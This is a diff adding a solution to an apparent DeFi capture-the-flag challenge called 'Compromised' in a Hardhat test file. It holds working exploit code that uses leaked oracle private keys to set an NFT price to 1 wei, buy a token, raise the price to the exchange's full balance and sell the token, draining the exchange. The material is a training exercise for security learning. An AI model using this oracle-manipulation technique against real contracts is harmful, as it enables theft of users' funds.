@@ -61,6 +61,56 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        /** 
+            Raw data -> Decode Hex -> Decode Base64 -> privatekey
+            (CyberChef is really helpful)    
+        */
+        let privatekeys = [
+            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        ]
+        let compromisedAccounts = [
+            new ethers.Wallet(privatekeys[0], ethers.provider), // publickey: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
+            new ethers.Wallet(privatekeys[1], ethers.provider), // publickey: 0x81A5D6E50C214044bE44cA0CB057fe119097850c
+        ]
+        let postprice = async (price) => {
+            for(let i=0;i<compromisedAccounts.length;i++){
+                await this.oracle.connect(compromisedAccounts[i]).postPrice("DVNFT", price);
+            }
+        }
+        console.log(`account[0]: ${compromisedAccounts[0].address}`);
+        console.log(`account[1]: ${compromisedAccounts[1].address}`);
+        let price;
+        let tokenID;
+        //// Post price to 1 wei
+        await postprice(1);
+        price = await this.oracle.getMedianPrice("DVNFT");
+        console.log(`Buying price : ${ethers.utils.formatEther(price, "ether")} ETH`);
+        //// Get token ID
+        // tokenID = await this.exchange.callStatic.buyOne({value:1});
+        //// Buy NFT
+        // await this.exchange.connect(attacker).buyOne({value:1});
+        let buyTX = await this.exchange.connect(attacker).buyOne({value:1});
+        let buyTXData = await buyTX.wait();
+        const buyEvent = buyTXData.events.find(event => event.event === "TokenBought");
+        const [buyer, tokenId, nftprice] = buyEvent.args;
+        console.log(`TokenBought event`);
+        console.log(`  buyer: ${buyer}`);
+        console.log(`  tokenId: ${tokenId}`);
+        console.log(`  nftprice: ${nftprice}`);
+        tokenID = tokenId;
+        //// Approve for exchange
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenID);
+        //// Post price to 9990 ETH + 1
+        let newPrice = await ethers.provider.getBalance(this.exchange.address);
+        await postprice(newPrice);
+        price = await this.oracle.getMedianPrice("DVNFT");
+        console.log(`Selling price: ${ethers.utils.formatEther(price, "ether")} ETH`);
+        //// Sell NFT 
+        await this.exchange.connect(attacker).sellOne(tokenID);
+        console.log(`Exchange.balance: ${await ethers.provider.getBalance(this.exchange.address)}`);
+        //// Set price back
+        await postprice(ethers.utils.parseEther("999", "ether"));
     });
 
     after(async function () {
